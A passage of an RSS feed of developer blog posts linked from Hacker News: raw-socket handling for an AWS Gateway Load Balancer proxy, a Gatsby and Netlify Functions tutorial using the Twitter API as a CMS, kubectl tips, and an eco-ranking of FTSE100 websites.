+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |  Protocol = 6 |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                  Source Address=10.1.0.152                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             Destination Address=209.85.202.138                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

TCP header
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Source Port=51714       |      Destination Port=80      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |           |U|A|P|R|S|F|                               |
| Offset| Reserved  |R|C|S|S|Y|I|            Window             |
|       |           |G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

HTTP data
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>The stack above is the exact packet that arrives at the appliance.</p>
<h3>Receiving raw packets with Python</h3>
<p>The AWS article <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/networking-and-content-delivery/integrate-your-custom-logic-or-appliance-with-aws-gateway-load-balancer/">Integrate your custom logic or appliance with AWS Gateway Load Balancer</a> states:</p>
<blockquote>
<p>When the appliance intends to forward the packet, it must do the following: […] swap the source and destination IP addresses in outer IPv4 header (i.e. Source IP = appliance IP address. Destination IP = GWLB IP address) […] update the IP checksum in outer IPv4 header.</p>
</blockquote>
<p>To be able to do this, we need to access the raw IP headers. When you create a normal UDP socket, like so:</p>
<pre><code>bind_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bind_sock.bind((UDP_IP, UDP_PORT))
</code></pre>
<p>You will only receive the data after the UDP header (the Geneve header will be at byte 0). To overcome this, we create a raw socket instead (<a rel="noopener noreferrer" href="https://github.com/sentialabs/geneve-proxy/blob/dda14347befb60c490e433f807c1a6cb256d6e4d/main.py#L21-L25">GitHub link</a>):</p>
<pre><code>geneve_sock = socket.socket(
    socket.AF_INET,
    socket.SOCK_RAW,
    socket.IPPROTO_UDP
)
</code></pre>
<p>This socket will receive all UDP data directed to the appliance EC2 instance, so it’s up to us to only process packets arriving at the Geneve port (6081).</p>
<h3>Parsing …</h3></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sentiatechblog.com/geneveproxy-an-aws-gateway-load-balancer-reference-application">https://www.sentiatechblog.com/geneveproxy-an-aws-gateway-load-balancer-reference-application</a></em></p>]]>
            </description>
            <link>https://www.sentiatechblog.com/geneveproxy-an-aws-gateway-load-balancer-reference-application</link>
            <guid isPermaLink="false">hacker-news-small-sites-25186242</guid>
            <pubDate>Mon, 23 Nov 2020 12:55:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use Netlify Functions and the Twitter API v2 as a CMS for Your Gatsby Blog]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25186006">thread link</a>) | @pauliescanlon
<br/>
November 23, 2020 | https://paulie.dev/posts/2020/11/gatsby-netlify-twitter/ | <a href="https://web.archive.org/web/*/https://paulie.dev/posts/2020/11/gatsby-netlify-twitter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://res.cloudinary.com/www-paulie-dev/image/upload/v1605613346/paulie.dev/2020/11/gatsby-netlify-twitterjpg_ok1k0q.jpg"></p><div><div><div><p>Date published: </p><!-- --><p>17-Nov-2020</p></div></div></div><hr><p>JavaScript</p><p>React</p><p>Gatsby</p><p>Netlify Functions</p><p>Twitter API v2</p><hr><p>Apologies in advance for the rather long-winded blog title but as it suggests in this post i'm going to explain how you can use <a href="https://www.netlify.com/products/functions/">Netlify Functions</a> to access your Twitter profile data using the <a href="https://developer.twitter.com/en/docs/twitter-api/early-access">Twitter v2 API</a> and display it on your Gatsby blog.</p><h2>A rather unique requirement</h2><p>This might be a specific to me but I wanted to solve a little problem I was having with my "digital footprint". As you can see I have this blog: <a href="https://paulie.dev/">https://paulie.dev</a> and a commercial portfolio: <a href="https://www.pauliescanlon.io/">https://www.pauliescanlon.io</a></p><p>Both sites are built on top of my Gatsby theme: <a href="https://gatsby-theme-terminal.netlify.app/">gatsby-theme-terminal</a> which is Open source and can be found on my <a href="https://github.com/PaulieScanlon/gatsby-theme-terminal">GitHub</a></p><p>Using a Gatsby Theme solves one of my issues as I'm able to have two sites that look and work pretty much the same way and any changes I make to the theme are inherited by both my sites. It's kind of like managing your own multi brand design system, but just for yourself.</p><p>There was one other problem though. 🤔</p><p>I wanted both sites to have the same "intro" section, but every time I made a change to one I had to make the same change to the other site to ensure they were both displaying the same intro text.</p><p>This might be fine if I weren't a developer but doing something twice is one time too many IMO.</p><p>It was also a little frustrating because I also wanted my Twitter profile description to be in sync with both the sites so, again another place to remember to update my personal blurb.</p><p>One option I considered would have been to hook up a Content Management System, and this would have been fine and it would have kept both my sites in sync but it wouldn't have been able to update my Twitter profile blurb...</p><p>So, I've decided to reverse engineer the Twitter API and use that as a CMS to populate both my sites. The idea is quite simple. I'll use the Twitter profile description as though it were a field from a CMS. Naturally any changes I make to this will appear on my Twitter profile and below is how I pull that same info into both of my sites.</p><h2>Demo</h2><p>Here's what I'll be showing you how to build:</p><ul><li>App / API <a href="https://gatsby-netlify-twitter.netlify.app/">https://gatsby-netlify-twitter.netlify.app</a></li><li>GitHub repo <a href="https://github.com/PaulieScanlon/gatsby-netlify-twitter">https://github.com/PaulieScanlon/gatsby-netlify-twitter</a></li></ul><p>... but the actual API I use for my blog and site is here: <a href="https://paulie-api.netlify.app/">https://paulie-api.netlify.app</a></p><h2>Tech</h2><h3>Netlify Functions</h3><p>"Power your site without managing servers" is how Netlify describe Functions and for all intents and purposes thats exactly what they are. Similar to how you might create an <a href="https://expressjs.com/">Express</a> app and deploy it somewhere but without the hassle of having to setup server side environments and more crucially any really dweeby server uptime monitoring.</p><h3>Twitter API v2</h3><p>A set of endpoints that can be used to get data from Twitter. Any Twitter requests must be done server side and use a set of keys and tokens. You can't unfortunately hit the Twitter API from the browser so we need a "server" or as mentioned above, a Netlify Function</p><p>Using both of the above i've made my own API endpoint which goes off and hits the Twitter API and returns my Profile information which I can then display in the intro section of my blog and site. I've deployed this API to Netlify and it's completely de-coupled from either of my sites but will return data which can be fetched from client side "fetch" request from within my site and blog. That url again is here: <a href="https://paulie-api.netlify.app/">https://paulie-api.netlify.app</a></p><h2>Before we start</h2><p>Before we get started there's a couple of things you'll need to have in place.</p><h3>Twitter API v2</h3><p>Apply for access to the <a href="https://developer.twitter.com/en/products/twitter-api">Twitter API</a>. This is quite a lengthy process so strap in and also bookmark this post as it might take a few days for Twitter to accept your application.</p><p>Once you have access you can head over to the <a href="https://developer.twitter.com/en/portal/dashboard">Developer Portal</a> and create a new project, and within the project you can create an "app", I called mine "paulie-api".</p><p>In here you'll find all the API keys and tokens required to access the Twitter API. Make a note of them somewhere as we'll be using them later.</p><h3>Netlify CLI</h3><p>To run Netlify Functions we'll be using <code>netlify dev</code> rather than <code>gatsby develop</code> or <code>yarn develop</code> so you'll need to install the <a href="https://docs.netlify.com/cli/get-started/">Netlify CLI</a></p><h2>The Build</h2><p>In order to develop you own API I found it easiest to have some kind of "site" running at the same time which will access the API endpoint and render the response on the page. In the demo repo you'll see i've set up a really simple Gatsby Site with one page that uses "fetch" to, er fetch and then render the data.</p><p>I've used <a href="https://theme-ui.com/home">Theme UI</a> for the style but naturally you can choose whatever you like to do this.</p><p>Whether you're starting from scratch or adding Netlify Functions to an existing project you'll need to start by adding a <code>functions</code> dir to the root of your project.</p><hr><pre><p><span>|</span><span>-- functions</span></p><p><span>  </span><span>|</span><span>-- package.json</span></p><p><span></span><span>|</span><span>-- src</span></p><p><span>package.json</span></p></pre><hr><p><code>functions</code> is kind of it's own application so it'll need it's own <code>package.json</code> and will have one dependency on <a href="https://github.com/HunterLarco/twitter-v2">twitter-v2</a></p><hr><pre><p><span></span><span>{</span><span></span></p><p><span>  </span><span>"name"</span><span>:</span><span> </span><span>"gatsby-netlify-twitter-api"</span><span>,</span><span></span></p><p><span>  </span><span>"version"</span><span>:</span><span> </span><span>"1.0.0"</span><span>,</span><span></span></p><p><span>  </span><span>"description"</span><span>:</span><span> </span><span>"An api for the Twitter v2 api"</span><span>,</span><span></span></p><p><span>  </span><span>"main"</span><span>:</span><span> </span><span>"index.js"</span><span>,</span><span></span></p><p><span>  </span><span>"scripts"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>"test"</span><span>:</span><span> </span><span>"echo \"Error: no test specified\" &amp;&amp; exit 1"</span><span></span></p><p><span>  </span><span>}</span><span>,</span><span></span></p><p><span>  </span><span>"keywords"</span><span>:</span><span> </span><span>[</span><span>]</span><span>,</span><span></span></p><p><span>  </span><span>"author"</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>  </span><span>"license"</span><span>:</span><span> </span><span>"ISC"</span><span>,</span><span></span></p><p><span>  </span><span>"dependencies"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>"twitter-v2"</span><span>:</span><span> </span><span>"^0.1.2"</span><span></span></p><p><span>  </span><span>}</span><span></span></p><p><span></span><span>}</span></p></pre><hr><p>Next have a look at <a href="https://github.com/PaulieScanlon/gatsby-netlify-twitter/blob/main/.env.example">.env.example</a>. You'll need to create your own <code>.env</code> file and add the environment variables as seen in the <code>.env.example</code>. Naturally you'll want to change the <code>GATSBY_TWITTER_USERNAME</code> to your own Twitter username and the Twitter keys and tokens will be what I referenced earlier which are provided by the Twitter Developer Portal</p><hr><pre><p><span></span><span>GATSBY_API_URL</span><span>=</span><span>.</span><span>/</span><span>.</span><span>netlify</span><span>/</span><span>functions</span></p><p><span></span><span>GATSBY_TWITTER_USERNAME</span><span>=</span><span></span></p><p><span></span><span>TWITTER_API_KEY</span><span>=</span><span></span></p><p><span></span><span>TWITTER_API_KEY_SECRET</span><span>=</span><span></span></p><p><span></span><span>TWITTER_ACCESS_TOKEN</span><span>=</span><span></span></p><p><span></span><span>TWITTER_ACCESS_TOKEN_SECRET</span><span>=</span></p></pre><hr><p>Next create a Twitter client, this is what we'll use to pass the keys and tokens onto the Twitter API when we make a request</p><hr><pre><p><span></span><span>const</span><span> </span><span>Twitter</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>"twitter-v2"</span><span>)</span><span></span></p><p><span>module</span><span>.</span><span>exports</span><span> </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>  client</span><span>:</span><span> </span><span>new</span><span> </span><span>Twitter</span><span>(</span><span>{</span><span></span></p><p><span>    consumer_key</span><span>:</span><span> process</span><span>.</span><span>env</span><span>.</span><span>TWITTER_CONSUMER_KEY</span><span>,</span><span></span></p><p><span>    consumer_secret</span><span>:</span><span> process</span><span>.</span><span>env</span><span>.</span><span>TWITTER_CONSUMER_KEY_SECRET</span><span>,</span><span></span></p><p><span>    access_token</span><span>:</span><span> process</span><span>.</span><span>env</span><span>.</span><span>TWITTER_ACCESS_TOKEN</span><span>,</span><span></span></p><p><span>    access_token_secret</span><span>:</span><span> process</span><span>.</span><span>env</span><span>.</span><span>TWITTER_ACCESS_TOKEN_SECRET</span><span>,</span><span></span></p><p><span>  </span><span>}</span><span>)</span><span>,</span><span></span></p><p><span></span><span>}</span></p></pre><hr><p>You should now be looking at something similar to the below</p><hr><pre><p><span>..</span><span>.</span></p><p><span></span><span>|</span><span>-- functions</span></p><p><span>  </span><span>|</span><span>-- client.js</span></p><p><span>  </span><span>|</span><span>-- package.json</span></p><p><span></span><span>|</span><span>-- src</span></p><p><span>package.json</span></p><p><span>.env</span></p><p><span></span><span>..</span><span>.</span></p></pre><hr><p>Now we need to create the "endpoint" that our frontend will hit, which in turn goes off and grabs the data from the Twitter API.</p><p>I created a dir called <code>twitter-user</code> and inside I create a new file and called it <code>twitter-user.js</code></p><hr><pre><p><span>..</span><span>.</span></p><p><span></span><span>|</span><span>-- functions</span></p><p><span>  </span><span>|</span><span>-- client.js</span></p><p><span>  </span><span>|</span><span>-- twitter-user</span></p><p><span>    </span><span>|</span><span>-- twitter-user.js</span></p><p><span>  </span><span>|</span><span>-- package.json</span></p><p><span></span><span>|</span><span>-- src</span></p><p><span>package.json</span></p><p><span>.env</span></p><p><span></span><span>..</span><span>.</span></p></pre><hr><p>It's in here where we can use the <code>client.js</code> to hit a Twitter API endpoint and pass with it the required keys and tokens from the <code>client</code></p><hr><pre><p><span></span><span>const</span><span> </span><span>{</span><span> client </span><span>}</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>"../client"</span><span>)</span><span></span></p><p><span>exports</span><span>.</span><span>handler</span><span> </span><span>=</span><span> </span><span>async</span><span> </span><span>(</span><span>event</span><span>,</span><span> context</span><span>,</span><span> callback</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>const</span><span> </span><span>{</span><span> data </span><span>}</span><span> </span><span>=</span><span> </span><span>await</span><span> client</span><span>.</span><span>get</span><span>(</span><span></span></p><p><span>    </span><span>`</span><span>users/by/username/</span><span>${</span><span>process</span><span>.</span><span>env</span><span>.</span><span>GATSBY_TWITTER_USERNAME</span><span>}</span><span>`</span><span>,</span><span></span></p><p><span>    </span><span>{</span><span></span></p><p><span>      user</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>        fields</span><span>:</span><span></span></p><p><span>          </span><span>"created_at,description,entities,id,location,name,pinned_tweet_id,profile_image_url,protected,public_metrics,url,username,verified,withheld"</span><span>,</span><span></span></p><p><span>      </span><span>}</span><span>,</span><span></span></p><p><span>    </span><span>}</span><span></span></p><p><span>  </span><span>)</span><span></span></p><p><span>  </span><span>callback</span><span>(</span><span>null</span><span>,</span><span> </span><span>{</span><span></span></p><p><span>    headers</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>      </span><span>"Access-Control-Allow-Origin"</span><span>:</span><span> </span><span>"*"</span><span>,</span><span></span></p><p><span>    </span><span>}</span><span>,</span><span></span></p><p><span>    statusCode</span><span>:</span><span> </span><span>200</span><span>,</span><span></span></p><p><span>    body</span><span>:</span><span> </span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span><span> user</span><span>:</span><span> data </span><span>}</span><span>)</span><span>,</span><span></span></p><p><span>  </span><span>}</span><span>)</span><span></span></p><p><span></span><span>}</span></p></pre><hr><p>In the above you can see we use our <code>client</code> to hit the <code>users/by/username</code> Twitter API endpoint which you can read more about <a href="https://developer.twitter.com/en/docs/twitter-api/users/lookup/introduction">here</a>, which returns a <code>data</code> object which I pass on to the callback body as <code>{ user: data }</code></p><p>This is the object that'll we receive in our frontend</p><p>The next bit will greatly depend on how you've set up your frontend but in the <a href="https://github.com/PaulieScanlon/gatsby-netlify-twitter/blob/main/src/pages/index.js">Demo</a> I have one <code>page</code> called <code>index.js</code> which uses a <code>useEffect</code> to "fetch" the data from the Netlify Function.</p><p>The example file contains a few extra bits for <code>isLoading</code> and <code>hasError</code> but the below should be enough to allow you hit to the Netlify Function which in turn hits the Twitter API and returns your profile information data.</p><hr><pre><p><span></span><span>import</span><span> </span><span>React</span><span>,</span><span> </span><span>{</span><span> useState </span><span>}</span><span> </span><span>from</span><span> </span><span>"react"</span><span></span></p><p><span></span><span>const</span><span> </span><span>IndexPage</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>const</span><span> </span><span>[</span><span>response</span><span>,</span><span> setResponse</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>{</span><span> user</span><span>:</span><span> </span><span>null</span><span> </span><span>}</span><span>)</span><span></span></p><p><span>  </span><span>useEffect</span><span>(</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>fetch</span><span>(</span><span>`</span><span>${</span><span>process</span><span>.</span><span>env</span><span>.</span><span>GATSBY_API_URL</span><span>}</span><span>/twitter-user</span><span>`</span><span>)</span><span></span></p><p><span>      </span><span>.</span><span>then</span><span>(</span><span>(</span><span>response</span><span>)</span><span> </span><span>=&gt;</span><span> response</span><span>.</span><span>text</span><span>(</span><span>)</span><span>)</span><span></span></p><p><span>      </span><span>.</span><span>then</span><span>(</span><span>(</span><span>response</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>        </span><span>console</span><span>.</span><span>log</span><span>(</span><span>JSON</span><span>.</span><span>parse</span><span>(</span><span>response</span><span>)</span><span>)</span><span></span></p><p><span>        </span><span>setResponse</span><span>(</span><span>JSON</span><span>.</span><span>parse</span><span>(</span><span>response</span><span>)</span><span>)</span><span></span></p><p><span>      </span><span>}</span><span>)</span><span></span></p><p><span>      </span><span>.</span><span>catch</span><span>(</span><span>(</span><span>error</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>        </span><span>console</span><span>.</span><span>error</span><span>(</span><span>{</span><span> error </span><span>}</span><span>)</span><span></span></p><p><span>      </span><span>}</span><span>)</span><span></span></p><p><span>  </span><span>}</span><span>,</span><span> </span><span>[</span><span>]</span><span>)</span><span></span></p><p><span>  </span><span>const</span><span> </span><span>{</span><span> user </span><span>}</span><span> </span><span>=</span><span> response</span></p><p><span>  </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>    </span><span>&lt;</span><span>pre</span><span>&gt;</span><span></span></p><p><span>      </span><span>&lt;</span><span>code</span><span>&gt;</span><span>{</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>user</span><span>,</span><span> </span><span>null</span><span>,</span><span> </span><span>2</span><span>)</span><span>}</span><span>&lt;</span><span>/</span><span>code</span><span>&gt;</span><span></span></p><p><span>    </span><span>&lt;</span><span>/</span><span>pre</span><span>&gt;</span><span></span></p><p><span>  </span><span>)</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>export</span><span> </span><span>default</span><span> </span><span>IndexPage</span></p></pre><hr><p><code>process.env.GATSBY_API_URL</code> is the path to the Netlify Function we added earlier to <code>.env</code> and i've hard-coded <code>/twitter-user</code> in the component / page as you might want to create different endpoints that return different data on different pages.</p><p>You might be wondering why this environment variable is prefixed with <code>GATSBY_</code>. This is so Gatsby can access it from the frontend. You can read more about Gatsby environment variables <a href="https://www.gatsbyjs.com/docs/environment-variables/#client-side-javascript">here</a></p><h3>IMPORTANT</h3><p>In order for Netlify Functions to work both locally and when deployed we need to ensure we've got <code>netlify-lambda</code> installed and have added both a <code>"start"</code> and <code>"postinstall"</code> script to the root <code>package.json</code> (not the <code>package.json</code> in <code>./functions</code>)</p><hr><pre><p><span>npm</span><span> </span><span>install</span><span> netlify-lambda --save -dev</span></p></pre><hr><pre><p><span>// ./package.json</span></p><p><span>...</span></p><p><span></span><span>  "scripts": {</span></p><p><span>    "develop": "gatsby develop",</span></p><p><span>    "build": "gatsby build",</span></p><p><span>    "clean": "gatsby clean",</span></p><p><span>    "serve": "gatsby serve",</span></p><p><span></span><span>+    "start": "npm run develop",</span></p><p><span>+    "postinstall": "netlify-lambda install"</span></p><p><span></span><span>  },</span></p><p><span>   "devDependencies": {</span></p><p><span></span><span>+   "netlify-lambda": "^1.6.3",</span></p><p><span></span><span>  }</span></p><p><span></span><span>...</span></p></pre><hr><p>Before we get too carried away, it's important to note that we'll no longer be using <code>gatsby develop</code> or <code>yarn develop</code> to start the Gatsby app, if you do that our Netlify Function won't be running and you'll get an error.</p><p>Instead, run <code>netlify dev</code> this is so both the Gatsby site and the Netlify Function are run at the same time.</p><p>Instead of visiting the usual <code>http://localhost:8000/</code> we'll now be visiting <code>http://localhost:8888/</code></p><p>And to ensure when we deploy everything works as it should you'll need to modify your <a href="https://github.com/PaulieScanlon/gatsby-netlify-twitter/blob/main/netlify.toml"><code>netlify.toml</code></a></p><p>For …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://paulie.dev/posts/2020/11/gatsby-netlify-twitter/">https://paulie.dev/posts/2020/11/gatsby-netlify-twitter/</a></em></p>]]>
            </description>
            <link>https://paulie.dev/posts/2020/11/gatsby-netlify-twitter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25186006</guid>
            <pubDate>Mon, 23 Nov 2020 12:27:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kubectl Tricks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25185960">thread link</a>) | @laktak
<br/>
November 23, 2020 | https://kuber.host/docs/kubectl_tricks | <a href="https://web.archive.org/web/*/https://kuber.host/docs/kubectl_tricks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3 id="run-command-in-a-pod">Run command in a pod</h3>
<p>It can be useful to execute some command inside running pod, for example see generated nginx's config</p>
<pre><code>
kubectl <span>exec</span> nginx-ingress-controller-j1xvs cat /etc/nginx/nginx.conf

kubectl <span>exec</span> my-pod -- df -h</code></pre>
<p>Use <code>-it</code> (interactive and tty) for interactive commands as bash, irb, top:</p>
<pre><code>kubectl <span>exec</span> -it my-pod-name bash

kubectl <span>exec</span> -it my-rails-app rails c</code></pre>
<h3 id="update-image-version-via-cli">Update image version via cli</h3>
<pre><code>kubectl <span>set</span> image deployment &lt;deployment-name&gt; &lt;container-name&gt;=new_image:img_version --record

kubectl <span>set</span> image deployment sample-app-deployment sample_app=midtrans/sample-app:<span>$PKG_VERSION</span> -n=my-namespace --record</code></pre>
<h3 id="edit-kubernete-resources">Edit kubernete resources</h3>
<p>Example:</p>
<pre><code>kubectl edit my-deployment</code></pre>
<p>It will open text editor with current definition of your resource, Default editor is <code>vi</code>, in case it's not your favorite one you may change it:</p>
<pre><code>KUBE_EDITOR=<span>"nano"</span> kubectl edit svc/my-service</code></pre>
<p>Or make your choice permanent by adding to <code>~/.bashrc</code> or <code>~/.zshrc</code></p>
<pre><code><span>export</span> KUBE_EDITOR=<span>"atom --wait"</span> 
<span>export</span> KUBE_EDITOR=<span>"mate -w"</span> 
<span>export</span> KUBE_EDITOR=<span>"nano"</span> 
<span>export</span> KUBE_EDITOR=<span>"subl --wait"</span> </code></pre>
<p>Also can control it with system-wide editor setting <code>$EDITOR</code></p>
<h3 id="save-k8s-objects-to-file">Save k8s objects to file</h3>
<p>Save resource as yaml:</p>
<pre><code>kubectl get deployment my-app -o yaml &gt; my-app-deployment.yaml</code></pre>
<p>Show resource as json with syntax highlight:</p>
<pre><code>kubectl get deployment my-app -o yaml | jq</code></pre>
<h3 id="show-latest-logs-from-pod">Show latest logs from pod</h3>
<p>Show last 100 lines and add new lines in real time (similar to <code>tail -f ...</code>)</p>
<pre><code>kubectl logs my-pod-name --tail 100 --follow</code></pre>
<p>Show logs from previous container (eg when it was crashed and restarted)</p>
<pre><code>kubectl logs my-pod-name --tail 100 --previous</code></pre>
<h3 id="get-running-resources">Get running resources</h3>
<p>Show all pods, services, deployments, replicasets, cronjobs, deamonsets and jobs</p>
<pre><code>kubectl get all</code></pre>
<h3 id="kubectl-auto-complete">Kubectl auto-complete</h3>
<p>Very useful, find it on <a href="https://kuber.host/docs/installing_kubectl#autocomplete">kubectl page</a></p>
<h3 id="kubectl-shell-prompt">Kubectl shell prompt</h3>
<p>It can show you current k8s cluster and namespace, take it from here: <a href="https://github.com/jonmosco/kube-ps1">https://github.com/jonmosco/kube-ps1</a></p>
<p>How to use it:</p>
<pre><code>
<span>source</span> <span>$ZSH</span>/plugins/kube-ps1/kube-ps2.zsh
KUBE_PS1_SYMBOL_COLOR=null
KUBE_PS1_CTX_COLOR=green
KUBE_PS1_SEPARATOR=<span>''</span>
KUBE_PS1_PREFIX=<span>'  '</span>
KUBE_PS1_SUFFIX=<span>''</span></code></pre>
<p>Result:
<br>
<img src="https://kuber.host/images/docs/kubectl-prompt.png"></p>
<h3 id="watch-pod-changes">Watch pod changes</h3>
<p>To make list of pods interactive, add <code>-w</code>: (it will add lines bellow for every change of pods' status)</p>
<pre><code>kubectl get pods -w</code></pre>
<p>To have <code>top</code>-like interactivity, we can use <code>watch</code> utility:  (works with any command at all, e.g. <code>date</code>)</p>
<pre><code>watch kubectl get pods</code></pre>
<h3 id="set-namespace-for-session">Set namespace for session</h3>
<p>Save it as default namespace to current config fil and e</p>
<pre><code>kubectl config <span>set</span>-context $(kubectl config current-context) --namespace=sample-app</code></pre>
<h3 id="using-kubectl-proxy">Using <code>kubectl proxy</code></h3>
<p>It will run a local web-server and make services in cluster accessible, run it with:</p>
<pre><code>kubectl proxy --port=8080</code></pre>
<p>Then can access kubernetes dashboard in browser at <a href="http://127.0.0.1:8080/api/v1/namespaces/YOUR-NAMESPACE/services/SERVICE-NAME:80/proxy">http://127.0.0.1:8080/api/v1/namespaces/YOUR-NAMESPACE/services/SERVICE-NAME:80/proxy</a></p>
<br>

<hr>
<p>More tools: <a href="https://github.com/mhausenblas/kubectl-in-action#tips-and-tricks">https://github.com/mhausenblas/kubectl-in-action#tips-and-tricks</a> and <a href="https://github.com/ramitsurana/awesome-kubernetes#apicli-adaptors">https://github.com/ramitsurana/awesome-kubernetes#apicli-adaptors</a></p>
</div></div>]]>
            </description>
            <link>https://kuber.host/docs/kubectl_tricks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25185960</guid>
            <pubDate>Mon, 23 Nov 2020 12:21:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ranking the FTSE100 websites on their impact to the planet]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25185821">thread link</a>) | @drydenwilliams
<br/>
November 23, 2020 | https://ecoping.earth/indexes/gb/ftse100 | <a href="https://web.archive.org/web/*/https://ecoping.earth/indexes/gb/ftse100">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><p>🚀 On a mission to reduce the carbon footprint of the Internet! 🌎</p></div><header><div><nav><a href="https://ecoping.earth/"><b>Eco</b>Ping.</a><div id="navbarCollapse"><ul><li><a href="https://ecoping.earth/indexes">Indexes</a></li><li><a href="https://ecoping.earth/cdn">CDN</a></li><li><a href="https://ecoping.earth/faqs">FAQs</a></li><li><a href="https://ecoping.earth/pricing">Pricing</a></li><li><a href="https://ecoping.earth/blog">Blog</a></li></ul></div></nav></div></header><main><section><p><h2>We've ranked the UKs FTSE100 websites in order of the most eco-friendly and their impact on the planet.</h2></p></section><div><p><svg viewBox="0 0 32 32" width="48" height="48" stroke-width="4" fill="none" stroke="currentcolor" role="img"><title>Loading...</title><circle cx="16" cy="16" r="12" opacity="0.125"></circle><circle cx="16" cy="16" r="12" stroke-dasharray="75.39822368615503" stroke-dashoffset="56.548667764616276"></circle></svg></p><table><thead><tr><th> Rank </th><th>Name</th><th>Site size</th><th>CO2 (g)</th><th>CSS</th><th>JS</th><th>Fonts</th><th>Images</th></tr></thead><tbody></tbody></table><div><div><h2>Want to make your own index?</h2><p>Once you've created an account and logged in. You simply add any sites you would like, and we will start tracking them over time; creating your very own personal index and eco-reports. It's super easy.</p></div></div><p><a href="https://ecoping.earth/indexes">&lt; Back to indexes</a></p></div></main><div><div><div><p>🕯 We've gone for dark mode to reduce the</p><!-- --> <p><a href="http://mobileenerlytics.com/dark-mode/" target="_blank" rel="noreferrer noopener">display power drawn</a></p><!-- --><p>of your devices.</p></div></div></div></div></div></div>]]>
            </description>
            <link>https://ecoping.earth/indexes/gb/ftse100</link>
            <guid isPermaLink="false">hacker-news-small-sites-25185821</guid>
            <pubDate>Mon, 23 Nov 2020 12:03:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Detective Game Design Problems]]>
            </title>
            <description>
<![CDATA[
Score 43 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25185571">thread link</a>) | @jsnell
<br/>
November 23, 2020 | https://digitales.games/blog/detective-game-design-problems | <a href="https://web.archive.org/web/*/https://digitales.games/blog/detective-game-design-problems">archive.org</a>
